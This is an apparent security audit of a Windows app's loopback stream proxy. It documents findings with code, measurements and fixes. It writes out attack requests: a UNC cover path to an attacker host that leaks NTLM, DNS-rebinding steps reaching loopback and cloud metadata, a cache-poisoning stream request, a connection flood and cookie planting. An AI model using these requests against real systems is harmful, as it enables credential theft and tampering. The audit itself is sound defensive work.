# WIN Audit — Area WN-11 (Loopback HTTP stream proxy) — Reviewer B (Architecture, Security & Performance)

## AREA WN-11 — Loopback HTTP stream proxy — ROLE B

### 1. Scope reviewed

**Files opened (path: line ranges actually read)**

| File | Lines read | Notes |
|---|---|---|
| `core/proxy.py` | 1–1334 (full file) | primary subject |
| `docs/audits/WIN_AUDIT_CONTEXT.md` | 1–200 (full) | common brief |
| `docs/audits/WIN_AUDIT_AREAS.md` | 1–70 (full) | area map |
| `core/api.py` | 85–214 | `_is_ssrf_safe_url`, `_dns_resolves_to_public_ip`, `_ssrf_cache` |
| `core/api.py` | 1208–1232, 1390–1424 | `get_proxy_info()` (token export), `get_proxy_url` use |
| `core/database.py` | 150–269, 2134–2188, 2380–2459 | thread-local connections, `tracks` schema/indexes, `get_cached_stream`, `set_cached_file`, `close_thread_connection` |
| `core/app.py` | 130–159, 535–579 | `LocalProxyManager` wiring, `cleanup()` ordering |
| `core/offline.py` | 1–77 (full) | `is_offline()` — called per stream chunk |
| `core/settings.py` | 296–375 | `SettingsManager.get()` — RLock-guarded in-memory cache |
| `utils/url_safety.py` | 1–37 (full) | the *other* SSRF implementation (`is_safe_media_url`) |
| `audio/engine.py` | 80–134 | proxy URL construction (`/?url=` vs `/api/stream?track_id=`) |
| `core/playback_recovery.py` | grep + 160–185 | `proxy.get_proxy_url()` consumer |
| `core/session.py` | grep | checked for token persistence — none |
| `main.py` | 340–369, grep | UI origin: local file path served by pywebview's Bottle server |
| `.venv_win/Lib/site-packages/webview/util.py`, `webview/http.py` | grep + read | confirms the UI origin is `http://127.0.0.1:<random port>` |
| `tests/test_proxy_harness.py` | 1–215 (full) | existing proxy test harness |
| `tests/test_proxy_security.py` | 1–204 (full) | existing security regressions |
| `socketserver.py` (CPython 3.14.7) | 660–730 | `ThreadingMixIn` contract |
| `urllib/request.py`, `http/server.py`, `http/client.py`, `ssl.py` (CPython 3.14.7) | inspected via `inspect.getsource` | redirect/header/ssl behaviour |

**Callees traced into other areas**

- `core/api.py::_is_ssrf_safe_url` → **owner WN-03** (bridge SSRF guard). `core/proxy.py:23` imports it.
- `utils/url_safety.py::is_safe_media_url` → **owner WN-27** (utility modules). Not used by the proxy.
- `core/database.py` thread-local connection model / `tracks` schema → **owner WN-12**.
- `core/app.py` lifecycle and `cleanup()` ordering → **owner WN-02**.
- `core/settings.py` `SettingsManager.get()` (RLock) → **owner WN-14**.
- `core/offline.py::is_offline` → **owner WN-09/WX-09**; consumed by the proxy's chunk loop.
- `core/resolver.py` → **owner WN-15**; reached indirectly via `AppCore.re_resolve_stream_url_async` (the proxy validates its result at `core/proxy.py:1054`).
- `audio/engine.py` proxy-URL construction → **owner WN-17**.
- `core/api.py::get_proxy_info` (exports the raw bearer to the JS layer) → **owner WN-03**.
- `core/downloader.py`, `core/download_transfer.py` → **owner WN-13** (not defects here; noted for the duplicated SSRF policy).

**Harness / measurement setup** — all numbers below were produced with the project's own interpreter
(`& ".venv_win\Scripts\python.exe"`, CPython **3.14.7**) against the **real** `core/proxy.py`,
`core/api.py` modules and a **live** `ThreadingHTTPServer` bound to 127.0.0.1. Scratch scripts live in
`%TEMP%\opencode\audit_scratch\` (`t1`–`t10b`). **No file in the repository was modified.**

---

### 2. Findings

#### F-WN-11-1  [P1] — Unauthenticated, unbounded thread-per-connection: a silent TCP connect pins a proxy thread forever

- **File:** `core/proxy.py:421-446` (`ThreadingHTTPServer`, `process_request`), `core/proxy.py:449-453` (`BaseHTTPRequestHandler` with no `timeout` override)
- **Confirmed:** yes
- **Description:** The proxy is a thread-per-connection server with **no cap on concurrent request threads** and **no socket timeout**. `socketserver.ThreadingMixIn.process_request` is overridden at `core/proxy.py:438` and spawns a `threading.Thread` unconditionally. `http.server.BaseHTTPRequestHandler.timeout` is `None` (measured), so `socketserver.StreamRequestHandler.setup()` never calls `settimeout()`. A peer that opens a TCP connection and sends **nothing** occupies a thread forever: `BaseHTTPRequestHandler.handle_one_request()` blocks in `self.rfile.readline(65537)` waiting for a request line that never arrives. The bearer check lives in `do_GET`/`do_HEAD` (`core/proxy.py:698`), i.e. **after** the request line and header block are read — so this resource-exhaustion primitive is **pre-authentication**.
- **Cause:** No admission control (thread cap / semaphore / bounded pool) and no per-connection deadline on the handler.
- **Trigger conditions:** Any local process can enumerate the ephemeral loopback port (`netstat -ano`, or `get_proxy_info()` at `core/api.py:1398-1405`) and open sockets. A web page can also open many sockets to `127.0.0.1` ports.
- **User impact:** Thread count grows without bound. Each Python thread reserves a Windows stack (default 1 MB) → memory exhaustion → the app is killed mid-playback. Combined with F-WN-11-2 (a single request can pin a thread for ~22 s) and the retry/backoff path (`core/proxy.py:1092-1115`, up to 4 attempts × 12 s timeout + ~7 s of `time.sleep`), legitimate slow upstreams already hold threads for a minute.
- **Evidence:**
  ```python
  # core/proxy.py:438-446
  def process_request(self, request, client_address):
      t = threading.Thread(target=self.process_request_thread, args=(request, client_address))
      t.daemon = self.daemon_threads
      with self._threads_lock:
          if self._threads is None or not isinstance(self._threads, list):
              self._threads = []
          self._threads = [th for th in self._threads if hasattr(th, "is_alive") and th.is_alive()]
          self._threads.append(t)
      t.start()
  ```
  Measured against a live `ThreadingHTTPServer`:
  ```
  === SLOWLORIS: open sockets that never send a request line ===
    server threads alive after 50 silent connections: 51 (elapsed 2.5s)
    server._threads tracked: 50
    BaseHTTPRequestHandler.timeout = None
  ```
- **Reproduction / verification:**
  ```powershell
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t7_live.py"
  ```
  (starts a real `ThreadingHTTPServer`, opens 50 sockets that send nothing, counts threads).
- **Suggested fix:** Give the handler a connection deadline (`timeout = 30` on `StreamProxyHandler`, which `socketserver` turns into `settimeout()`), and cap concurrency — a `threading.BoundedSemaphore` acquired in `process_request` with a non-blocking reject, or a bounded worker pool.
- **Fix side effects:** A timeout must be generous enough not to cut off a legitimate slow client on a bad link; a thread cap will make the proxy refuse excess concurrent range requests (the browser may need several in flight) — pick a cap well above the browser's per-origin connection limit (6) and the HLS.js segment concurrency.
- **Discovered by:** B

---

#### F-WN-11-2  [P2] — A UNC path in the cover/avatar resolver performs a blocking network-filesystem call (measured 22 s) and offers the user's NTLM to a remote host

- **File:** `core/proxy.py:183-206` (`_resolve_inside_roots`, used by `_safe_cover_path` / `_safe_avatar_path`); compare the guard that **does** exist at `core/proxy.py:250-255` (`_safe_stream_local_path`)
- **Confirmed:** yes
- **Description:** `_safe_stream_local_path` explicitly refuses UNC and `file:` inputs **before** any filesystem access, with the correct rationale. `_resolve_inside_roots` — the cover/avatar path — has **no such guard**: it calls `os.path.realpath(candidate)` on an attacker-supplied string. On Windows, `os.path.realpath` calls `GetFinalPathNameByHandle`, which **opens the path** — for a UNC path that means an SMB connection to `\\<host>\share\...`, i.e. outbound network I/O to an attacker-chosen host, and Windows will negotiate NTLM with it. The containment check (`_is_inside_roots`) runs **after** the `realpath`, so the network call has already happened.
- **Cause:** The two path-safety entry points implement the same policy independently; the stricter one's guard was never propagated to the other.
- **Trigger conditions:** `GET /api/cover?path=\\<attacker-host>\share\cover.jpg&k=<token>` or `/api/avatar?path=...`. The backslashes survive `parse_qs` untouched.
- **User impact:**
  1. **Thread stall:** measured **22.46 s** for a non-resolving host (DNS + SMB connect timeout). With F-WN-11-1 (no thread cap), N such requests pin N threads for ~22 s each.
  2. **Credential exposure:** the SMB connection offers the user's NTLM challenge/response to the attacker's server. An NTLMv1/v2 response is crackable offline and usable for relay — the classic Windows UNC-credential-leak primitive.
- **Evidence:**
  ```python
  # core/proxy.py:191-203  (_resolve_inside_roots — NO UNC guard)
  try:
      if not raw_path:
          return ''
      candidate = raw_path
      if candidate.startswith('file:///'):
          candidate = candidate[len('file:///'):]
      candidate = os.path.normpath(urllib.parse.unquote(candidate))
      ext = os.path.splitext(candidate)[1].lower()
      if ext not in extensions:
          return ''
      resolved = os.path.realpath(candidate)      # <-- opens \\host\share\... over SMB
      if _is_inside_roots(resolved, roots):
          return resolved if os.path.isfile(resolved) else ''
  ```
  ```python
  # core/proxy.py:251-255  (_safe_stream_local_path — the guard that IS present)
  # UNC and file://host/ paths make realpath()/isfile() open an SMB
  # connection on Windows, so they are refused before any FS access.
  if raw.startswith(('\\\\', '//')) or raw.lower().startswith('file:'):
      logger.warning('Refused /api/stream read of UNC/file-URL path: %s', raw[:120])
      return ''
  ```
  Measured:
  ```
  realpath(UNC) -> '\\nonexistent-host-abcxyz.invalid\share\cover.jpg' in 22.46s
    _resolve_inside_roots(UNC) -> '' in 0.01s      # 2nd call: DNS negative cache
    _safe_stream_local_path(UNC) -> '' in 0.00s    # refused before any FS access
  ```
- **Reproduction / verification:**
  ```powershell
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t3_net_crlf.py"
  ```
  (timing of `os.path.realpath` on a UNC path vs. the guarded stream path.)
- **Suggested fix:** Extract the UNC / `file:` / device-path normalisation into one shared helper and call it from **both** `_resolve_inside_roots` and `_safe_stream_local_path` before any `realpath`/`isfile` call.
- **Fix side effects:** None — the guard only refuses paths that could never legitimately resolve inside a managed root.
- **Discovered by:** B

---

#### F-WN-11-3  [P2] — A fresh urllib opener is built per request: ~4.8 ms of SSL-context rebuild and zero connection reuse

- **File:** `core/proxy.py:390-393` (`_safe_urlopen`), invoked at `core/proxy.py:1016`
- **Confirmed:** yes
- **Description:** `_safe_urlopen` calls `urllib.request.build_opener(...)` on **every** proxied request. `build_opener` instantiates the default handler set, which includes `HTTPSHandler()` → `http.client._create_https_context()` → on Windows, `ssl.load_default_certs()` **enumerates the machine + user ROOT certificate store**. Measured **4.789 ms** per `HTTPSHandler()` and **6.277 ms** per `build_opener()`. In addition, `urllib`/`http.client` never reuse connections: `http.client` sends `Connection: close` unless keep-alive is explicitly negotiated, so **every upstream fetch pays a full TCP + TLS handshake**.
- **Cause:** The redirect handler is bundled with the opener construction instead of being separated from the (expensive, reusable) transport configuration.
- **Trigger conditions:** Every proxied stream. Amplified by the two known multi-request paths: (a) `_bound_googlevideo_range` (`core/proxy.py:74-88`) caps each open-ended range at **1 MiB**, so a 5 MB track becomes 5 upstream range requests; (b) **HLS.js is in use** (`ui/web_new_v2/js/player.js:122-132`), and every `.ts`/`.m4s` segment is a separate `/?url=…` request → a separate proxy request → a separate opener → a separate handshake.
- **User impact:** Measured cost of the opener alone: **~6 ms of CPU per upstream request**, all on the single-GIL Python process that also hosts the pywebview bridge, the audio engine and the downloader. At 60–120 HLS segments per track that is **0.36–0.72 s of pure overhead per track**; plus 60–120 fresh TCP+TLS handshakes to the CDN (2–3 RTT ≈ 60–300 ms each on a WAN) → **4–36 s of pure handshake latency per track** that a keep-alive connection pool would amortise to one handshake.
- **Evidence:**
  ```python
  # core/proxy.py:390-393
  def _safe_urlopen(req, timeout=12.0, source=''):
      """Open URL using custom SafeRedirectHandler enforcing strict SSRF checks on every redirect."""
      opener = urllib.request.build_opener(SafeRedirectHandler(max_redirects=5, source=source))
      return opener.open(req, timeout=timeout)
  ```
  Measured:
  ```
  build_opener()      : 6.277 ms per call
  HTTPSHandler()      : 4.789 ms   <-- ssl._create_default_https_context()
  ssl._create_default_https_context(): 4.737 ms per call
  ProxyHandler()      : 0.009 ms
  socket.create_connection (fresh TCP, loopback): 0.096 ms
  ```
- **Reproduction / verification:**
  ```powershell
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t5_opener.py"
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t6_ssl.py"
  ```
- **Suggested fix:** Build one opener per process (or per worker thread) and reuse it; give it a connection-pooling transport; keep the SSRF-validating redirect handler per request or make its counter request-scoped.
- **Fix side effects:** **Important** — `SafeRedirectHandler.redirect_count` is *instance* state (`core/proxy.py:372`, incremented at `:376`). A shared handler instance would turn the 5-redirect cap into a **process-lifetime** cap: after 5 redirects in the whole session, every later redirect would raise "Too many redirects". The counter must be reset per request (CPython already maintains a per-request `req.redirect_dict`) or a fresh handler instance must be created per request while only the expensive `SSLContext`/`ProxyHandler` are cached. A cached `SSLContext` also freezes the ROOT-CA snapshot for the process lifetime.
- **Discovered by:** B

---

#### F-WN-11-4  [P2] — `process_request` replaces `socketserver`'s thread tracker with a plain list, so `server_close()` raises `AttributeError` on every shutdown

- **File:** `core/proxy.py:438-446` (`ThreadingHTTPServer.process_request`), `core/proxy.py:425` (`block_on_close = False`), `core/proxy.py:1284-1298` (`LocalProxyManager.stop`)
- **Confirmed:** yes
- **Description:** CPython 3.14's `ThreadingMixIn` keeps `_threads` as a `_ThreadJoiner`/`_Threads` object and ends `server_close()` with `self._threads.join()`. The project's `process_request` override replaces `_threads` with a **plain Python list**, so `join()` no longer exists. `server_close()` therefore raises `AttributeError: 'list' object has no attribute 'join'`. `LocalProxyManager.stop()` swallows it with a blanket `except Exception`. The `block_on_close = False` attribute — intended to say "don't wait for request threads on close" — is **inert** in Python 3.14 (`server_close()` calls `join()` unconditionally); the intent is realised only *by accident*, through the exception.
- **Cause:** A subclass overrode `socketserver`'s thread-tracking contract with an incompatible data structure.
- **Trigger conditions:** Any shutdown **after at least one request has been served** (before the first request, `_threads` is still the class-level `_NoThreads()` and `join()` is a no-op).
- **User impact:** The shutdown path is silently broken. `super().server_close()` *does* run first, so the listening socket is closed and the proxy does stop — but (a) in-flight request threads are never drained, so audio in flight is truncated when the app closes; (b) the only thing standing between this and a hard crash on every app exit is the blanket `except Exception` at `core/proxy.py:1291-1294`; (c) the project already knows — `tests/test_proxy_harness.py:153-158` catches `AttributeError` with the comment *"Python 3.14's ThreadingMixIn.server_close() ends with self._threads.join(), but this project tracks _threads in a plain list … Pre-existing, harmless for the tests"*.
- **Evidence:**
  ```python
  # CPython 3.14.7 socketserver.py
  class ThreadingMixIn:
      block_on_close = True
      _threads = _NoThreads()
      def server_close(self):
          super().server_close()
          self._threads.join()          # <-- expects a joinable tracker
  ```
  ```python
  # core/proxy.py:441-445
  with self._threads_lock:
      if self._threads is None or not isinstance(self._threads, list):
          self._threads = []              # <-- clobbers the _ThreadJoiner
      self._threads = [th for th in self._threads if hasattr(th, "is_alive") and th.is_alive()]
      self._threads.append(t)
  ```
  Measured against a live server after one request:
  ```
  === server_close() after >=1 request ===
    server_close() raised AttributeError("'list' object has no attribute 'join'")
  ```
- **Reproduction / verification:**
  ```powershell
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t7_live.py"
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t8_cors.py"
  ```
- **Suggested fix:** Keep the tracker contract: stop replacing `self._threads`, and keep the project's own bookkeeping in a separate attribute (e.g. `self._request_threads`). Or override `server_close()` explicitly and document that request threads are intentionally not joined.
- **Fix side effects:** If the CPython tracker is restored, `block_on_close` must stay `False` or shutdown will block on long-lived streams; the daemon-thread rationale (`core/proxy.py:426-430`, pinned by `tests/test_proxy_harness.py:185-202`) must be preserved.
- **Discovered by:** B

---

#### F-WN-11-5  [P2] — SSRF guard: resolve-then-connect TOCTOU, and the "safe" DNS verdict is memoized for 120 s

- **File:** `core/proxy.py:23-24` (import), `core/proxy.py:841` and `core/proxy.py:954` (guards), `core/proxy.py:1016` (connect); root cause in `core/api.py:133-158` and `core/api.py:161-195` (owner: **WN-03**)
- **Confirmed:** code path **yes**; end-to-end exploitation is a **hypothesis**
- **Description:** `_is_ssrf_safe_url` resolves the hostname with `socket.getaddrinfo(hostname, None)` and caches the verdict for **120 s** in the module-global `_ssrf_cache`. The actual connection is then made by `urllib` → `http.client` → `socket.create_connection(host, port)` → **a second `getaddrinfo` whose result is never validated**. The guard therefore checks one DNS answer and connects to a possibly different one. The 120 s memo turns a millisecond-wide race into a **two-minute window**: a host that answers with a public address at check time and with `127.0.0.1` at connect time passes the guard and is fetched by the proxy.
- **Cause:** Classic TOCTOU on DNS, amplified by an unbounded cache TTL on the *permissive* verdict.
- **Trigger conditions:** An attacker-controlled DNS name with a low TTL that the app is asked to proxy. The `/?url=` and `/api/stream?url=` endpoints accept arbitrary hosts (subject to the guard), and `core/api.py::import_external_playlist` (`core/api.py:2365`) feeds external playlist URLs into the app.
- **User impact:** SSRF to loopback services — including the app's own pywebview bridge server on `http://127.0.0.1:<bottle_port>` — and to `169.254.169.254` on a cloud-hosted install. This is exactly what the guard exists to prevent.
- **Evidence:**
  ```python
  # core/api.py:143-158
  verdict = True
  try:
      addr_info = socket.getaddrinfo(hostname, None)
      for family, socktype, proto, canonname, sockaddr in addr_info:
          ip = ipaddress.ip_address(sockaddr[0])
          if ip.is_loopback or ip.is_private or ...:
              verdict = False; break
  except Exception:
      if hostname.startswith("169.254.") or hostname.startswith("10.") or ...:
          verdict = False
  _ssrf_cache_put(hostname, verdict)      # cached for _SSRF_CACHE_TTL = 120.0
  return verdict
  ```
  Measured:
  ```
  === the verdict is MEMOIZED for 120s ===
    getaddrinfo calls for 51 checks of the SAME host: 1  (first=1)
  === resolve-then-connect TOCTOU ===
    check   : socket.getaddrinfo(hostname, None)  -> verdict cached
    connect : urllib -> http.client -> socket.create_connection(host, port) -> getaddrinfo AGAIN
  ```
- **Reproduction / verification:**
  ```powershell
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t9_ssrf.py"
  ```
  To confirm exploitability: point an authoritative DNS name at a public address, make one proxied request (populating the 120 s cache), then re-point the name to `127.0.0.1` and make a second request; the second request is fetched from loopback.
- **Suggested fix:** Resolve once, validate the address, and **connect to the validated address** (or re-validate the peer address after `connect()`), and stop caching the *permissive* verdict for 120 s.
- **Fix side effects:** Pinning the IP breaks TLS SNI/certificate validation unless the `Host` header and `server_hostname` are preserved; the minimal safe mitigation is to shorten the memo TTL to a few seconds and re-resolve at connect time.
- **Discovered by:** B (root-cause implementation is **WN-03**; see also the ARCH note on the duplicated policy)

---

#### F-WN-11-6  [P3] — Upstream response headers are forwarded verbatim, including `Set-Cookie` and `Content-Type`

- **File:** `core/proxy.py:1162-1165`
- **Confirmed:** yes
- **Description:** The forwarding loop strips only the hop-by-hop headers and anything starting with `access-control-`. Everything else — including `Set-Cookie`, `Content-Type`, `Location`, `Refresh`, `Link` — is copied verbatim into the proxy's own response.
- **Cause:** No allow-list of safe-to-forward response headers.
- **Trigger conditions:** Any upstream the proxy fetches. The `?url=` endpoint accepts arbitrary hosts, so a URL reachable from an imported playlist is enough.
- **User impact:**
  1. **Cookie planting on the shared loopback origin.** A `Set-Cookie: evil=1; Path=/` from the upstream becomes a **host-only cookie for `127.0.0.1`**. Cookies are host-scoped and **not** port-scoped, so that cookie is subsequently sent to the app's **own** pywebview Bottle origin (`http://127.0.0.1:<bottle_port>`, confirmed via `.venv_win/Lib/site-packages/webview/http.py:98-106`, which serves the UI from `main.py:339 html_path`) — i.e. session fixation / cookie tossing into the application's own origin.
  2. **Attacker-controlled MIME type on the proxy origin.** The upstream's `Content-Type: text/html` is served from `http://127.0.0.1:<proxyport>`, an origin distinct from the app's, so the pywebview bridge is not directly reachable — but it is an XSS/content-sniffing foothold on a loopback origin that also serves the token-bearing endpoints.
- **Evidence:**
  ```python
  # core/proxy.py:1162-1165
  for header, val in headers_list:
      h_low = header.lower()
      if h_low not in HOP_BY_HOP and not h_low.startswith('access-control-'):
          self.send_header(header, val)
  ```
  Measured against a fake upstream returning `Set-Cookie: evil=1; Path=/` and `Content-Type: text/html`:
  ```
    status: 200
      Content-Type                 text/html; charset=utf-8
      Set-Cookie                   evil=1; Path=/
      X-Whatever                   ok
      Content-Length               38
    body: b'<html><script>alert(1)</script></html>'
  ```
- **Reproduction / verification:**
  ```powershell
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t8_cors.py"
  ```
- **Suggested fix:** Forward an allow-list (`content-type`, `content-length`, `content-range`, `accept-ranges`, `etag`, `last-modified`) rather than a deny-list, and always force the response `Content-Type` to an audio/playlist type on the streaming routes.
- **Fix side effects:** Some CDNs use `Set-Cookie` for their own continuity, but the proxy does not forward the *client's* cookies upstream, so dropping the upstream's `Set-Cookie` breaks nothing in the current design.
- **Discovered by:** B

---

#### F-WN-11-7  [P3] — The Yandex OAuth token is attached to plain-HTTP upstream hosts

- **File:** `core/proxy.py:1002-1006` (and the re-resolved variant at `core/proxy.py:1076-1078`)
- **Confirmed:** yes
- **Description:** `_host_allows_credentials(url, source)` (`core/proxy.py:91-99`) matches on **host only**; the URL scheme is never considered. `req.add_header('Authorization', f'OAuth {token}')` therefore puts the user's Yandex OAuth token on a `http://` request in cleartext.
- **Cause:** The credential policy checks ownership of the host but not the transport.
- **Trigger conditions:** Any upstream under `yandex.ru` / `yandex.net` / `yandex.com` reached over plain HTTP. Additionally, `build_opener` installs `ProxyHandler()` built from the **Windows registry** (`urllib.request.getproxies()` — measured returning `{'ag_ls': 'http://127.0.0.1:53129', 'no': '127.0.0.1,localhost,::1'}` on this machine), so with a system HTTP proxy configured the cleartext request — token included — is handed to that proxy.
- **User impact:** The OAuth token is exposed to the local network and to any system proxy on the path; a Yandex token grants access to the user's account.
- **Evidence:**
  ```python
  # core/proxy.py:1002-1006
  elif source == 'yandex':
      if self.server.app_core.settings:
          token = self.server.app_core.settings.get('auth', 'yandex_token', '')
      if token:
          req.add_header('Authorization', f'OAuth {token}')
  ```
  ```python
  # core/proxy.py:91-99 — host-only ownership test, no scheme check
  def _host_allows_credentials(url: str, source: str) -> bool:
      suffixes = CREDENTIAL_HOSTS.get(source or '')
      ...
      return any(host == sfx or host.endswith('.' + sfx) for sfx in suffixes)
  ```
- **Reproduction / verification:** point `source=yandex` at a `http://yandex.ru/...` URL and observe the `Authorization` header on the outbound request (or point it at a local listener and inspect).
- **Suggested fix:** Require `https` for any credential-bearing target (both when attaching and when re-attaching after a self-heal re-resolve).
- **Fix side effects:** All three providers redirect to HTTPS today; if one ever serves plain HTTP only, its playback would break — make it a warning + a redirect-follow rather than a hard refusal.
- **Discovered by:** B

---

#### F-WN-11-8  [P3] — The shared stream cache can be poisoned with a client-supplied `source` / `source_id`

- **File:** `core/proxy.py:796-812` (cache lookup), `core/proxy.py:1187-1208` (cache write via `set_cached_file`)
- **Confirmed:** yes (code path); the exploitation precondition (the token) is a hypothesis
- **Description:** In the `/api/stream` branch, `source` and `source_id` come straight from the query string when no `track_id` is supplied. After the upstream fetch, the response body is written to `~/.nedotify/streams/<source>_<source_id>.<ext>` and registered with `db.set_cached_file(source, source_id, final_path)` — keyed by the **client-supplied** pair, with no binding to a track row.
- **Cause:** The cache key is taken from untrusted input and is not validated against the track identity the request claims to represent.
- **Trigger conditions:** `GET /api/stream?source=youtube&source_id=<real video id>&url=<attacker url>&k=<token>` → the proxy fetches the attacker's URL and stores it under the victim's `(source, source_id)`.
- **User impact:** **Audio substitution** — the victim later plays the track and hears the attacker's audio. The poisoned entry persists in `stream_cache` until it expires.
- **Evidence:**
  ```python
  # core/proxy.py:1187-1208
  final_path = os.path.join(streams_dir, f"{cache_name}{_ext_for_response(resp)}")
  bytes_written = 0
  with open(temp_path, 'wb') as tmp:
      ...
  if bytes_written > 0 and (expected_len is None or bytes_written == expected_len):
      os.replace(temp_path, final_path)
      self.server.app_core.db.set_cached_file(source, source_id, final_path)
  ```
- **Reproduction / verification:** issue the request above with a URL under your control and then request `/api/stream?source=youtube&source_id=<same id>&k=<token>` with no `url=`; the cached attacker file is served.
- **Suggested fix:** Key the write on the track identity the request actually resolved (the `tracks` row id), and refuse to write to the shared cache from the generic `?url=` path where no track identity exists.
- **Fix side effects:** The generic `?url=` route would lose cache-warming; that is the correct trade-off — an unattributable download should not be published into a named track's cache slot.
- **Discovered by:** B

---

#### F-WN-11-9  [P3] — `_is_ssrf_safe_url` fails **open** when DNS resolution fails, and the permissive verdict is then memoized for 120 s

- **File:** `core/api.py:143-158` (owner: **WN-03**); consumed by the proxy at `core/proxy.py:23-24`
- **Confirmed:** yes
- **Description:** In `_dns_resolves_to_public_ip`, `verdict` is initialised to `True` and is only flipped to `False` inside the `try`. If `socket.getaddrinfo` raises, the `except` branch only checks the hostname's literal prefix (`169.254.` / `10.` / `192.168.` / `127.`), so **any other unresolvable host is judged safe** — and that "safe" verdict is written into the 120 s cache.
- **Cause:** The default value of the verdict is the permissive one, and the failure path does not fail closed.
- **Trigger conditions:** Any transient DNS failure (offline, VPN flap, captive portal) while the app proxies a URL.
- **User impact:** A momentary DNS outage turns a two-minute window in which an arbitrary hostname is considered safe — the same window that F-WN-11-5 uses for rebinding. If DNS recovers inside the window with a private answer, the connection goes through unchecked.
- **Evidence:**
  ```python
  # core/api.py:143-158
  verdict = True
  try:
      addr_info = socket.getaddrinfo(hostname, None)
      ...
  except Exception:
      # If DNS resolution fails, fallback string check
      if hostname.startswith("169.254.") or hostname.startswith("10.") or hostname.startswith("192.168.") or hostname.startswith("127."):
          verdict = False
  _ssrf_cache_put(hostname, verdict)
  return verdict
  ```
  Measured:
  ```
  === fail-open when DNS resolution fails ===
    _is_ssrf_safe_url('http://does-not-exist.invalid/x') -> True
    _is_ssrf_safe_url('http://169.254.169.254/latest/meta-data/') -> False
  ```
  **Honest scoping of this finding:** the hex/octal IPv4 spellings (`0x7f000001`, `0177.0.0.1`, `0x7f.0.0.1`) also come back "safe" through this path on this Windows build — **but the connection fails with the same `gaierror`**, so no working bypass exists here:
  ```
    0x7f000001     guard_safe=True  connect_reaches=unresolvable
    urllib http://0x7f000001:51976/secret -> URLError: <urlopen error [Errno 11001] getaddrinfo failed>
  ```
  The real exposure is the cached window, not the numeric spellings.
- **Reproduction / verification:**
  ```powershell
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t9_ssrf.py"
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t10b_hexip.py"
  ```
- **Suggested fix:** Initialise `verdict = False` and only set it to `True` after a successful resolution of exclusively public addresses. (Owner: WN-03.)
- **Fix side effects:** Hosts whose DNS is temporarily unavailable would be refused instead of attempted — the correct fail-closed behaviour for a security guard; the downloader already uses the fail-closed `utils/url_safety.is_safe_media_url` and is unaffected in practice.
- **Discovered by:** B (implementation owned by **WN-03**)

---

#### F-WN-11-10  [P3] — `do_OPTIONS` is unauthenticated, and the error paths omit the CORS headers

- **File:** `core/proxy.py:615-620` (`do_OPTIONS`); error responses at `core/proxy.py:712`, `:718`, `:730`, `:765`, `:792`, `:901`, `:1080`, `:1088`, `:1098`, `:1119`, `:1123`, `:454-467`
- **Confirmed:** yes
- **Description:** (a) `do_OPTIONS` answers `204` with the allowed methods/headers **without** calling `_authenticate`, so it is the only route that needs no bearer. (b) The error responses are emitted with `self.send_error(...)` / `self.send_response(...)` **without** `_send_cors_headers()`, so a cross-origin `fetch()` from the app's own origin sees an opaque CORS failure instead of the status code.
- **Cause:** CORS headers are attached at the success sites only; there is no single response-emission path.
- **Trigger conditions:** Any `OPTIONS` probe; any 4xx/5xx response consumed via `fetch()` from the UI origin (`http://127.0.0.1:<bottle_port>`, a different port from the proxy → cross-origin).
- **User impact:** (a) confirms to a local prober that a proxy is listening and advertises `Range`/`Authorization` as accepted request headers — reconnaissance, no data exposure. (b) The frontend loses the ability to distinguish "not found" from "forbidden" from "upstream failed" on cross-origin calls.
- **Evidence:**
  ```python
  # core/proxy.py:615-620
  def do_OPTIONS(self):
      self.send_response(204)
      self._send_cors_headers()
      self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
      self.send_header('Access-Control-Allow-Headers', 'Range, Content-Type, Authorization')
      self.end_headers()
  ```
  Measured against a live proxy:
  ```
  === CORS: success path vs error path ===
    OK cover     -> 200  ACAO='http://127.0.0.1:8080'  Content-Type='image/jpeg'
    404 cover    -> 404  ACAO=None                    Content-Type='text/html;charset=utf-8'
    403 no token -> 403  ACAO=None                    Content-Type='application/json'
  === do_OPTIONS is NOT authenticated ===
    OPTIONS /api/stream (no token) -> 204 {'Server': 'BaseHTTP/0.6 Python/3.14.7', ...}
  ```
- **Reproduction / verification:**
  ```powershell
  & ".venv_win\Scripts\python.exe" "C:\Users\Артур\AppData\Local\Temp\opencode\audit_scratch\t8_cors.py"
  ```
- **Suggested fix:** Route the `OPTIONS` handler through `_authenticate` (or explicitly allow only the CORS preflight shape), and emit `_send_cors_headers()` from a single response helper used by both the success and error paths.
- **Fix side effects:** A browser preflight (`OPTIONS` without credentials) is sent *before* the authenticated `GET`; requiring the token on `OPTIONS` would break the preflight unless the token is also allowed in the preflight — check how the UI issues proxy requests (currently it uses `<img>`/`<audio>` `src`, which do not preflight) before tightening.
- **Discovered by:** B

---

### 3. Clean areas

Checked and found **correct** (with the evidence noted):

1. **Local-file disclosure — the primary P0 surface — holds.** I ran a live escape battery against `_resolve_inside_roots` and `_safe_stream_local_path`: `..` traversal, percent-encoded traversal, **double** percent-decoding (`%252e%252e%252f`), absolute paths outside the roots, drive-relative (`C:foo`), `\\?\` device paths, UNC (`\\host\share`, `//host/share`), `file:///` and `file://host/` URLs, trailing dots (`file.jpg.`), trailing spaces (`file.jpg `), trailing space on a directory component, NTFS alternate data streams (`file.jpg:stream`, `file.jpg:foo.mp3`), and the reserved device names `NUL.mp3`, `COM1.mp3`, `CON.mp3`, `PRN.mp3`, `LPT1.mp3` — **every one was refused** (`''`), and no file content was disclosed. (`%TEMP%\opencode\audit_scratch\t2_escape.py`)
